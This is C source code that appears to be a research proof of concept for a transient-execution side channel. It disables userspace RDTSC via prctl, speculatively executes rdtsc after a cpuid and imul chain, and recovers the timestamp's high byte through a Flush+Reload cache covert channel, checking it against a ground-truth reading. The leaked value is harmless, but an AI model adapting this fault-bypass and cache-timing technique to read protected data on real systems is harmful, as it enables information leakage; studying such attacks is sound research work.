#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <immintrin.h>
#include <sys/prctl.h>
#include <pthread.h>

#include "cacheutils_t.h"

//
// Code tested on: Intel Core i5-2520M
//

#define SPACING 4096

char mem[8][SPACING * 300];

volatile size_t dummy = 0;

void disable_rdtsc() {
  // disable RDTSC in userspace
  prctl(PR_SET_TSC, PR_TSC_SIGSEGV);
}

void enable_rdtsc() {
  // enable RDTSC in userspace
  prctl(PR_SET_TSC, PR_TSC_ENABLE);
}

void counting_thread() {
    size_t cnt = 0;
    while(1) {
        cnt++;
        ts_ = cnt;
    }
}

static inline uint64_t rdtsc_ground_truth() {
  uint64_t a = 0, d = 0;
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  a = (d << 32) | a;
  return a;
}

int main(int argc, char* argv[])
{
  memset(mem, 1, sizeof(mem));
  
  pthread_t p;
  pthread_create(&p, NULL, counting_thread, NULL);
  sched_yield();

  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss @ %zd\n", CACHE_MISS);
  enable_rdtsc();

  int i, j;
  for(j = 0; j < 8; j++) {
    for (i = 0; i < 256; i++)
    {
        flush(mem[j] + i * SPACING);
    }
  }
  asm volatile("mfence");

  signal(SIGSEGV, trycatch_segfault_handler); 
  
  for(int i = 0; i < 1000; i++) {
    dummy++;
  }
  
    uint64_t low = 0, high = 0, try = 0;
    size_t start = rdtsc();

    disable_rdtsc();

    do {
        for(int rep = 0; rep < 10; rep++) {
            if(!setjmp(trycatch_buf))
            {
                asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
                asm volatile ("imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n"
		                "imul %%rcx, %%rcx\n" : : "c"(1) : "memory");
		                
                asm volatile("rdtsc\n" : "=a"(low), "=d"(high) : "c"(2) : "memory");
                maccess(mem[0] + ((high) & 0xff) * SPACING);
                
                try_abort();
            }

        }
    
        int hits = 0;
        size_t recovered = 0;
        for(j = 0; j < 1; j++) {
            for(i = 1; i < 255; i++) {
                if (flush_reload(mem[j] + i * SPACING))
                {
                    recovered |= i * (1 << (j * 8));
                    hits++;
                }
            }
        }
        if(hits == 1) {
            printf("Leakage: 0x%xXXXXXXXX (try %zd)\n", recovered, try);
            break;
        }
        try++;
    } while(try < 100);

    enable_rdtsc();
    size_t end = rdtsc();
    
    size_t ground_truth = rdtsc_ground_truth();
    printf("Ground Truth: 0x%lxXXXXXXXX\n", (ground_truth & 0xff00000000) >> 32);
    printf("Took %zd cycles\n", end - start);

    fflush(stdout);

  exit(EXIT_SUCCESS);
}
